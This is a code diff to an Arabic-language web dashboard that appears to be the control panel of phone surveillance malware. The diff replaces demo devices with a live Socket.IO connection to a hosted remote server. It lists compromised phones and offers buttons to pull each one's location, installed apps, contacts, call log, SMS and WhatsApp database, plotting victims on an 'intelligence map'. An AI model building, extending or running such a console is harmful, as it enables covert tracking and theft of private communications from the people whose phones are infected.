@@ -477,6 +477,32 @@ footer {
   opacity: 0.7;
 }
 
+/* Connection Status */
+.connection-status {
+  display: flex;
+  align-items: center;
+  margin-left: 15px;
+  padding: 5px 10px;
+  border-radius: 20px;
+  font-size: 12px;
+  font-weight: bold;
+}
+
+.connected {
+  background: var(--success-color);
+  color: white;
+}
+
+.connecting {
+  background: var(--warning-color);
+  color: white;
+}
+
+.disconnected {
+  background: var(--danger-color);
+  color: white;
+}
+
 /* Responsive Design */
 @media (max-width: 992px) {
   .container {
@@ -535,6 +561,9 @@ footer {
         <i class="fas fa-user-shield"></i>
       </div>
       <div>مدير النظام</div>
+      <div class="connection-status connecting" id="connectionStatus">
+        <i class="fas fa-sync-alt fa-spin"></i> جاري الاتصال...
+      </div>
     </div>
   </header>
   
@@ -555,7 +584,7 @@ footer {
     <section id="panel-devices" class="panel active">
       <div class="panel-header">
         <h2><i class="fas fa-microchip"></i> الأجهزة المتصلة</h2>
-        <div>عدد الأجهزة: <span id="devices-count">3</span></div>
+        <div>عدد الأجهزة: <span id="devices-count">0</span></div>
       </div>
       
       <div class="stats-cards">
@@ -564,7 +593,7 @@ footer {
             <i class="fas fa-mobile-alt"></i>
           </div>
           <div class="stat-info">
-            <h3>3</h3>
+            <h3 id="active-devices">0</h3>
             <p>أجهزة نشطة</p>
           </div>
         </div>
@@ -574,7 +603,7 @@ footer {
             <i class="fas fa-map-marker-alt"></i>
           </div>
           <div class="stat-info">
-            <h3>2</h3>
+            <h3 id="located-devices">0</h3>
             <p>مواقع محددة</p>
           </div>
         </div>
@@ -584,10 +613,16 @@ footer {
             <i class="fas fa-database"></i>
           </div>
           <div class="stat-info">
-            <h3>127</h3>
+            <h3 id="data-points">0</h3>
             <p>بيانات مجمعة</p>
           </div>
         </div>
+      </div>
+      
+      <div id="devices-empty" style="text-align: center; padding: 40px; color: #6c757d;">
+        <i class="fas fa-plug" style="font-size: 48px; margin-bottom: 15px;"></i>
+        <h3>لا توجد أجهزة متصلة</h3>
+        <p>سيتم عرض الأجهزة فور اتصالها بالسيرفر</p>
       </div>
       
       <div class="device-grid" id="devices">
@@ -599,7 +634,7 @@ footer {
     <section id="panel-map" class="panel">
       <div class="panel-header">
         <h2><i class="fas fa-map-marked-alt"></i> الخريطة الاستخباراتية</h2>
-        <button class="btn btn-primary"><i class="fas fa-sync-alt"></i> تحديث الخريطة</button>
+        <button class="btn btn-primary" id="refreshMap"><i class="fas fa-sync-alt"></i> تحديث الخريطة</button>
       </div>
       
       <div id="map"></div>
@@ -625,7 +660,12 @@ footer {
       </div>
       
       <div class="commands-container">
-        <div class="command-form">
+        <div id="no-devices-message" style="text-align: center; padding: 20px; color: #6c757d;">
+          <i class="fas fa-exclamation-circle" style="font-size: 24px; margin-bottom: 10px;"></i>
+          <p>لا توجد أجهزة متصلة لإصدار الأوامر</p>
+        </div>
+        
+        <div class="command-form" id="command-form" style="display: none;">
           <div class="form-group">
             <label for="deviceSelect"><i class="fas fa-microchip"></i> اختر الجهاز</label>
             <select id="deviceSelect" class="form-control">
@@ -686,11 +726,127 @@ footer {
 <script src="/socket.io/socket.io.js"></script>
 <script>
 // Initialize socket connection
-const socket = io('https://projectd-vu1m.onrender.com', { 
-  transports: ['websocket'], 
-  reconnection: true 
-});
-socket.emit('adminJoin');
+let socket;
+let reconnectAttempts = 0;
+const maxReconnectAttempts = 5;
+
+function connectSocket() {
+  socket = io('https://projectd-vu1m.onrender.com', { 
+    transports: ['websocket', 'polling'], 
+    reconnection: true,
+    reconnectionAttempts: maxReconnectAttempts,
+    reconnectionDelay: 1000,
+    timeout: 20000
+  });
+  
+  setupSocketEvents();
+}
+
+function setupSocketEvents() {
+  // Update connection status
+  socket.on('connect', () => {
+    updateConnectionStatus('connected', 'متصل بالسيرفر');
+    reconnectAttempts = 0;
+    socket.emit('adminJoin');
+    addLog('تم الاتصال بالسيرفر بنجاح', 'success');
+  });
+  
+  socket.on('disconnect', (reason) => {
+    updateConnectionStatus('disconnected', 'انقطع الاتصال');
+    addLog(`انقطع الاتصال بالسيرفر: ${reason}`, 'error');
+    
+    if (reason === 'io server disconnect') {
+      // Server intentionally disconnected, try to reconnect
+      socket.connect();
+    }
+  });
+  
+  socket.on('connect_error', (error) => {
+    updateConnectionStatus('connecting', 'جاري إعادة الاتصال...');
+    reconnectAttempts++;
+    addLog(`خطأ في الاتصال: ${error.message} (محاولة ${reconnectAttempts}/${maxReconnectAttempts})`, 'error');
+  });
+  
+  socket.on('reconnect_attempt', (attempt) => {
+    updateConnectionStatus('connecting', `محاولة إعادة الاتصال (${attempt}/${maxReconnectAttempts})`);
+  });
+  
+  socket.on('reconnect', (attempt) => {
+    updateConnectionStatus('connected', 'تم إعادة الاتصال');
+    addLog(`تم إعادة الاتصال بعد ${attempt} محاولة`, 'success');
+  });
+  
+  socket.on('reconnect_failed', () => {
+    updateConnectionStatus('disconnected', 'فشل إعادة الاتصال');
+    addLog('فشل إعادة الاتصال بعد جميع المحاولات', 'error');
+  });
+  
+  // Handle device connection
+  socket.on('join', device => {
+    renderDevice(device);
+    updateDevicesCount();
+    addLog(`جهاز متصل: ${device.id} (${device.model || 'غير معروف'})`, 'success');
+  });
+  
+  // Handle device disconnection
+  socket.on('deviceDisconnected', deviceId => {
+    const deviceElement = document.getElementById(`device_${deviceId}`);
+    if (deviceElement) {
+      deviceElement.remove();
+      delete devicesMap[deviceId];
+      updateDevicesCount();
+      addLog(`انقطع اتصال الجهاز: ${deviceId}`, 'warning');
+    }
+    
+    // Remove from select dropdown
+    const option = document.querySelector(`#deviceSelect option[value="${deviceId}"]`);
+    if (option) {
+      option.remove();
+    }
+  });
+  
+  // Handle existing devices when admin joins
+  socket.on('existingDevices', devices => {
+    addLog(`جاري تحميل ${devices.length} جهاز متصل`, 'info');
+    devices.forEach(device => {
+      renderDevice(device);
+    });
+    updateDevicesCount();
+  });
+  
+  // Handle request results
+  socket.on('requestResult', payload => {
+    try {
+      const obj = typeof payload === 'string' ? JSON.parse(payload) : payload;
+      addLog(`طلب ${obj.action} → ${obj.to}: ${obj.ok ? 'نجح' : 'فشل'}`, obj.ok ? 'success' : 'error');
+      
+      const extraDiv = document.getElementById('extra_' + obj.to);
+      if (obj.ok && obj.result) {
+        switch (obj.action) {
+          case 'getLocation':
+            extraDiv.innerHTML = `
+              <div style="margin-top: 10px; padding: 10px; background: var(--darker-bg); border-radius: 4px;">
+                <strong>الموقع:</strong> ${obj.result.data.lat}, ${obj.result.data.lon}<br>
+                <strong>العنوان:</strong> ${obj.result.data.address || 'غير متاح'}
+              </div>
+            `;
+            renderDevice({id: obj.to, lastLocation: obj.result.data});
+            updateMapWithDevice(obj.to, obj.result.data);
+            break;
+          default:
+            extraDiv.innerHTML = `
+              <div style="margin-top: 10px; padding: 10px; background: var(--darker-bg); border-radius: 4px;">
+                <strong>النتيجة:</strong> ${JSON.stringify(obj.result.data).substring(0, 150)}...
+              </div>
+            `;
+        }
+      }
+    } catch (e) { 
+      console.error('Error processing request result:', e);
+      addLog('خطأ في معالجة الاستجابة من الجهاز', 'error');
+    }
+  });
+}
 
 // DOM Elements
 const devicesDiv = document.getElementById('devices');
@@ -704,6 +860,13 @@ const osintResults = document.getElementById('osintResults');
 const osintSearchBtn = document.getElementById('osintSearchBtn');
 const clearLogsBtn = document.getElementById('clear-logs');
 const devicesCountEl = document.getElementById('devices-count');
+const activeDevicesEl = document.getElementById('active-devices');
+const locatedDevicesEl = document.getElementById('located-devices');
+const dataPointsEl = document.getElementById('data-points');
+const connectionStatusEl = document.getElementById('connectionStatus');
+const refreshMapBtn = document.getElementById('refreshMap');
+const noDevicesMessage = document.getElementById('no-devices-message');
+const commandForm = document.getElementById('command-form');
 
 const devicesMap = {}; 
 let map, markers = {};
@@ -731,23 +894,98 @@ document.addEventListener('DOMContentLoaded', function() {
     addLog('تم مسح سجل الأحداث', 'info');
   });
   
+  // Refresh map button
+  refreshMapBtn.addEventListener('click', () => {
+    initMap();
+    addLog('تم تحديث الخريطة', 'info');
+  });
+  
   // Add some initial logs
   addLog('تم تحميل لوحة التحكم بنجاح', 'success');
   addLog('جاري الاتصال بالسيرفر...', 'info');
   
-  // Simulate initial devices for demo purposes
-  setTimeout(() => {
-    simulateDevices();
-  }, 1000);
+  // Initialize socket connection
+  connectSocket();
 });
+
+// Update connection status UI
+function updateConnectionStatus(status, message) {
+  connectionStatusEl.className = `connection-status ${status}`;
+  
+  let icon = 'fa-sync-alt fa-spin';
+  if (status === 'connected') icon = 'fa-check-circle';
+  if (status === 'disconnected') icon = 'fa-times-circle';
+  
+  connectionStatusEl.innerHTML = `<i class="fas ${icon}"></i> ${message}`;
+}
 
 // Initialize Leaflet map
 function initMap() {
-  if (map) return;
+  if (map) {
+    map.remove();
+    markers = {};
+  }
+  
   map = L.map('map').setView([24.0, 45.0], 5);
   L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
     attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
   }).addTo(map);
+  
+  // Add existing devices with locations to the map
+  Object.keys(devicesMap).forEach(deviceId => {
+    const deviceElement = document.getElementById(`device_${deviceId}`);
+    if (deviceElement) {
+      const extraDiv = deviceElement.querySelector('.device-extra');
+      if (extraDiv && extraDiv.textContent.includes('الموقع:')) {
+        const match = extraDiv.textContent.match(/الموقع:\s*([0-9.]+),\s*([0-9.]+)/);
+        if (match && match.length === 3) {
+          const lat = parseFloat(match[1]);
+          const lon = parseFloat(match[2]);
+          updateMapWithDevice(deviceId, { lat, lon });
+        }
+      }
+    }
+  });
+}
+
+// Update map with device location
+function updateMapWithDevice(deviceId, locationData) {
+  if (!map) initMap();
+  
+  if (markers[deviceId]) {
+    markers[deviceId].setLatLng([locationData.lat, locationData.lon]);
+  } else {
+    markers[deviceId] = L.marker([locationData.lat, locationData.lon])
+      .addTo(map)
+      .bindPopup(`<b>${deviceId}</b><br>${locationData.address || ''}`);
+  }
+}
+
+// Update devices count
+function updateDevicesCount() {
+  const count = Object.keys(devicesMap).length;
+  devicesCountEl.textContent = count;
+  activeDevicesEl.textContent = count;
+  
+  // Show/hide no devices message
+  const devicesEmpty = document.getElementById('devices-empty');
+  if (count === 0) {
+    devicesEmpty.style.display = 'block';
+    noDevicesMessage.style.display = 'block';
+    commandForm.style.display = 'none';
+  } else {
+    devicesEmpty.style.display = 'none';
+    noDevicesMessage.style.display = 'none';
+    commandForm.style.display = 'grid';
+  }
+  
+  // Update located devices count
+  const locatedCount = Object.values(devicesMap).filter(device => {
+    const extraDiv = device.querySelector('.device-extra');
+    return extraDiv && extraDiv.textContent.includes('الموقع:');
+  }).length;
+  
+  locatedDevicesEl.textContent = locatedCount;
 }
 
 // Render device function
@@ -758,30 +996,7 @@ function renderDevice(device) {
     deviceCard = document.createElement('div');
     deviceCard.className = 'device-card';
     deviceCard.id = 'device_' + device.id;
-    deviceCard.innerHTML = `
-      <div class="device-header">
-        <div class="device-id">${device.id}</div>
-        <div class="device-status">نشط</div>
-      </div>
-      <div class="device-body">
-        <div class="device-info">
-          <div><i class="fas fa-mobile-alt"></i> ${device.model || 'غير معروف'}</div>
-          <div><i class="fas fa-globe"></i> ${device.ip || 'غير متاح'}</div>
-          <div><i class="fas fa-code-branch"></i> ${device.platform || 'N/A'}</div>
-          <div><i class="fas fa-language"></i> ${device.language || 'N/A'}</div>
-          <div><i class="fas fa-desktop"></i> ${device.screen ? device.screen.width + 'x' + device.screen.height : 'N/A'}</div>
-        </div>
-        <div id="extra_${device.id}" class="device-extra"></div>
-        <div class="device-actions">
-          <button class="btn btn-primary" onclick="requestLocation('${device.id}')"><i class="fas fa-map-marker-alt"></i> الموقع</button>
-          <button class="btn btn-primary" onclick="requestApps('${device.id}')"><i class="fas fa-th"></i> التطبيقات</button>
-          <button class="btn btn-secondary" onclick="requestContacts('${device.id}')"><i class="fas fa-address-book"></i> جهات اتصال</button>
-          <button class="btn btn-secondary" onclick="requestCallLog('${device.id}')"><i class="fas fa-phone"></i> المكالمات</button>
-          <button class="btn btn-secondary" onclick="requestSMS('${device.id}')"><i class="fas fa-sms"></i> الرسائل</button>
-          <button class="btn btn-secondary" onclick="requestWhatsappDB('${device.id}')"><i class="fab fa-whatsapp"></i> واتساب</button>
-        </div>
-      </div>
-    `;
+    
     devicesDiv.appendChild(deviceCard);
     devicesMap[device.id] = deviceCard;
 
@@ -790,22 +1005,49 @@ function renderDevice(device) {
     opt.value = device.id;
     opt.textContent = device.id + ' (' + (device.model || 'N/A') + ')';
     deviceSelect.appendChild(opt);
-    
-    // Update devices count
-    devicesCountEl.textContent = Object.keys(devicesMap).length;
   }
+  
+  // Update device card content
+  deviceCard.innerHTML = `
+    <div class="device-header">
+      <div class="device-id">${device.id}</div>
+      <div class="device-status">نشط</div>
+    </div>
+    <div class="device-body">
+      <div class="device-info">
+        <div><i class="fas fa-mobile-alt"></i> ${device.model || 'غير معروف'}</div>
+        <div><i class="fas fa-globe"></i> ${device.ip || 'غير متاح'}</div>
+        <div><i class="fas fa-code-branch"></i> ${device.platform || 'N/A'}</div>
+        <div><i class="fas fa-language"></i> ${device.language || 'N/A'}</div>
+        <div><i class="fas fa-desktop"></i> ${device.screen ? device.screen.width + 'x' + device.screen.height : 'N/A'}</div>
+      </div>
+      <div id="extra_${device.id}" class="device-extra"></div>
+      <div class="device-actions">
+        <button class="btn btn-primary" onclick="requestLocation('${device.id}')"><i class="fas fa-map-marker-alt"></i> الموقع</button>
+        <button class="btn btn-primary" onclick="requestApps('${device.id}')"><i class="fas fa-th"></i> التطبيقات</button>
+        <button class="btn btn-secondary" onclick="requestContacts('${device.id}')"><i class="fas fa-address-book"></i> جهات اتصال</button>
+        <button class="btn btn-secondary" onclick="requestCallLog('${device.id}')"><i class="fas fa-phone"></i> المكالمات</button>
+        <button class="btn btn-secondary" onclick="requestSMS('${device.id}')"><i class="fas fa-sms"></i> الرسائل</button>
+        <button class="btn btn-secondary" onclick="requestWhatsappDB('${device.id}')"><i class="fas fa-comment"></i> واتساب</button>
+      </div>
+    </div>
+  `;
 
-  // Update device location on map if available
+  // Update device location if available
   if (device.lastLocation && device.lastLocation.lat && device.lastLocation.lon) {
-    initMap();
-    if (markers[device.id]) {
-      markers[device.id].setLatLng([device.lastLocation.lat, device.lastLocation.lon]);
-    } else {
-      markers[device.id] = L.marker([device.lastLocation.lat, device.lastLocation.lon])
-        .addTo(map)
-        .bindPopup(`<b>${device.id}</b><br>${device.model || ''}<br>${device.lastLocation.address || ''}`);
+    const extraDiv = document.getElementById('extra_' + device.id);
+    if (extraDiv) {
+      extraDiv.innerHTML = `
+        <div style="margin-top: 10px; padding: 10px; background: var(--darker-bg); border-radius: 4px;">
+          <strong>الموقع:</strong> ${device.lastLocation.lat}, ${device.lastLocation.lon}<br>
+          <strong>العنوان:</strong> ${device.lastLocation.address || 'غير متاح'}
+        </div>
+      `;
     }
+    updateMapWithDevice(device.id, device.lastLocation);
   }
+  
+  updateDevicesCount();
 }
 
 // Add log entry
@@ -826,45 +1068,10 @@ function addLog(msg, type = 'info') {
   
   logsDiv.appendChild(logEntry);
   logsDiv.scrollTop = logsDiv.scrollHeight;
+  
+  // Update data points counter
+  dataPointsEl.textContent = parseInt(dataPointsEl.textContent || 0) + 1;
 }
-
-// Handle device connection
-socket.on('join', device => {
-  renderDevice(device);
-  addLog(`جهاز متصل: ${device.id} (${device.model || 'غير معروف'})`, 'success');
-});
-
-// Handle request results
-socket.on('requestResult', payload => {
-  try {
-    const obj = JSON.parse(payload);
-    addLog(`طلب ${obj.action} → ${obj.to}: ${obj.ok ? 'نجح' : 'فشل'}`, obj.ok ? 'success' : 'error');
-    
-    const extraDiv = document.getElementById('extra_' + obj.to);
-    if (obj.ok && obj.result) {
-      switch (obj.action) {
-        case 'getLocation':
-          extraDiv.innerHTML = `
-            <div style="margin-top: 10px; padding: 10px; background: var(--darker-bg); border-radius: 4px;">
-              <strong>الموقع:</strong> ${obj.result.data.lat}, ${obj.result.data.lon}<br>
-              <strong>العنوان:</strong> ${obj.result.data.address || 'غير متاح'}
-            </div>
-          `;
-          renderDevice({id: obj.to, lastLocation: obj.result.data});
-          break;
-        default:
-          extraDiv.innerHTML = `
-            <div style="margin-top: 10px; padding: 10px; background: var(--darker-bg); border-radius: 4px;">
-              <strong>النتيجة:</strong> ${JSON.stringify(obj.result.data).substring(0, 150)}...
-            </div>
-          `;
-      }
-    }
-  } catch (e) { 
-    console.error(e);
-    addLog('خطأ في معالجة الاستجابة', 'error');
-  }
-});
 
 // Send command
 sendCommandBtn.addEventListener('click', () => {
@@ -976,45 +1183,9 @@ osintSearchBtn.addEventListener('click', () => {
       osintResults.appendChild(resultDiv);
     });
     
-    addLog(`تم заверزالبحث عن: ${query} - تم العثور على ${sources.length} مصدر`, 'success');
+    addLog(`تم انتهاء البحث عن: ${query} - تم العثور على ${sources.length} مصدر`, 'success');
   }, 2000);
 });
-
-// Simulate initial devices for demonstration
-function simulateDevices() {
-  const demoDevices = [
-    {
-      id: 'DEV-001',
-      model: 'Samsung Galaxy S21',
-      ip: '192.168.1.101',
-      platform: 'Android 12',
-      language: 'ar-SA',
-      screen: { width: 1080, height: 2400 }
-    },
-    {
-      id: 'DEV-002', 
-      model: 'iPhone 13 Pro',
-      ip: '192.168.1.102',
-      platform: 'iOS 15',
-      language: 'ar-SA',
-      screen: { width: 1170, height: 2532 }
-    },
-    {
-      id: 'DEV-003',
-      model: 'Huawei P40',
-      ip: '192.168.1.103', 
-      platform: 'Android 10',
-      language: 'ar-EG',
-      screen: { width: 1080, height: 2340 }
-    }
-  ];
-  
-  demoDevices.forEach(device => {
-    renderDevice(device);
-  });
-  
-  addLog('تم تحميل 3 أجهزة تجريبية', 'info');
-}
 </script>
 </body>
-  </html>
+</html>
